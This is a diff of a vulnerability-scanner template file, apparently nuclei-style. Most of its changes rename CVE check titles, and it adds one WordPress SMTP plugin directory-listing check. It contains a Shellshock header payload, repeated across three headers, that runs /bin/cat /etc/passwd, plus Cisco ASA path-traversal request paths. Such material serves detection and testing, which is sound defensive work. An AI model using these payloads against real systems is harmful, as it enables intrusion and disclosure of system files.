@@ -3277,9 +3277,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -9500,7 +9500,7 @@
     {
       "id": "CVE-2020-13937",
       "info": {
-        "name": "Apache Kylin Unauth",
+        "name": "Apache Kylin Exposed Configuration File",
         "severity": "medium"
       },
       "requests": [
@@ -10855,6 +10855,22 @@
           "path": [
             "{{BaseURL}}/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../",
             "{{BaseURL}}/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-35234",
+      "info": {
+        "name": "SMTP WP Plugin Directory Listing",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/easy-wp-smtp/",
+            "{{BaseURL}}/wp-content/plugins/wp-mail-smtp-pro/"
           ]
         }
       ]
@@ -15360,7 +15376,7 @@
     {
       "id": "CVE-2021-42566",
       "info": {
-        "name": "myfactory FMS  -  Reflected XSS",
+        "name": "myfactory FMS  -  Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15376,7 +15392,7 @@
     {
       "id": "CVE-2021-42567",
       "info": {
-        "name": "Apereo CAS Reflected XSS",
+        "name": "Apereo CAS Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15390,7 +15406,7 @@
     {
       "id": "CVE-2021-43062",
       "info": {
-        "name": "Fortinet Fortimail 7.0.1 - Reflected XSS",
+        "name": "Fortinet FortiMail 7.0.1 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15420,7 +15436,7 @@
     {
       "id": "CVE-2021-43495",
       "info": {
-        "name": "AlquistManager lfi",
+        "name": "AlquistManager Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -15435,7 +15451,7 @@
     {
       "id": "CVE-2021-43496",
       "info": {
-        "name": "Clustering LFI",
+        "name": "Clustering Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -15450,7 +15466,7 @@
     {
       "id": "CVE-2021-43778",
       "info": {
-        "name": "GLPI plugin Barcode < 2.6.1 path traversal vulnerability.",
+        "name": "GLPI plugin Barcode < 2.6.1 Path Traversal Vulnerability.",
         "severity": "critical"
       },
       "requests": [
@@ -15480,7 +15496,7 @@
     {
       "id": "CVE-2021-43810",
       "info": {
-        "name": "Admidio - Reflected XSS",
+        "name": "Admidio - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15495,7 +15511,7 @@
     {
       "id": "CVE-2021-44228",
       "info": {
-        "name": "Remote code injection in Log4j",
+        "name": "Apache Log4j2 Remote Code Injection",
         "severity": "critical"
       },
       "requests": [
@@ -15556,7 +15572,7 @@
     {
       "id": "CVE-2021-45043",
       "info": {
-        "name": "HD-Network Real-time Monitoring System 2.0 - Local File Inclusion",
+        "name": "HD-Network Realtime Monitoring System 2.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -15570,7 +15586,7 @@
     {
       "id": "CVE-2021-45046",
       "info": {
-        "name": "Remote code injection in Log4j",
+        "name": "Apache Log4j2 Remote Code Injection",
         "severity": "critical"
       },
       "requests": [
@@ -15599,7 +15615,7 @@
     {
       "id": "CVE-2021-45232",
       "info": {
-        "name": "Apache APISIX Dashboard api unauth access",
+        "name": "Apache APISIX Dashboard API Unauthorized Access",
         "severity": "critical"
       },
       "requests": [
@@ -15614,7 +15630,7 @@
     {
       "id": "CVE-2021-45380",
       "info": {
-        "name": "AppCMS - Reflected Cross-Site Scripting (XSS)",
+        "name": "AppCMS - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15629,7 +15645,7 @@
     {
       "id": "CVE-2021-46005",
       "info": {
-        "name": "Sourcecodester Car Rental Management System 1.0 - Stored XSS",
+        "name": "Sourcecodester Car Rental Management System 1.0 - Stored Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15645,7 +15661,7 @@
     {
       "id": "CVE-2022-0149",
       "info": {
-        "name": "WooCommerce – Store Exporter < 2.7.1 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WooCommerce Stored Exporter WordPress Plugin < 2.7.1 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15660,7 +15676,7 @@
     {
       "id": "CVE-2022-0218",
       "info": {
-        "name": "HTML Email Template Designer < 3.1 - Stored Cross-Site Scripting (XSS)",
+        "name": "HTML Email Template Designer < 3.1 - Stored Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15690,7 +15706,7 @@
     {
       "id": "CVE-2022-0378",
       "info": {
-        "name": "Microweber XSS",
+        "name": "Microweber Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15705,7 +15721,7 @@
     {
       "id": "CVE-2022-0432",
       "info": {
-        "name": "CVE-2022-0432",
+        "name": "Mastodon Prototype Pollution Vulnerability",
         "severity": "medium"
       },
       "requests": [
@@ -15720,7 +15736,7 @@
     {
       "id": "CVE-2022-0653",
       "info": {
-        "name": "Wordpress Profile Builder Plugin XSS",
+        "name": "Wordpress Profile Builder Plugin Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15803,7 +15819,7 @@
     {
       "id": "CVE-2022-23808",
       "info": {
-        "name": "phpMyAdmin < 5.1.2 - XSS",
+        "name": "phpMyAdmin < 5.1.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15863,7 +15879,7 @@
     {
       "id": "CVE-2022-25369",
       "info": {
-        "name": "Dynamicweb 9.5.0 - 9.12.7 Unauthenticated Admin addition",
+        "name": "Dynamicweb 9.5.0 - 9.12.7 Unauthenticated Admin User Creation",
         "severity": "critical"
       },
       "requests": [
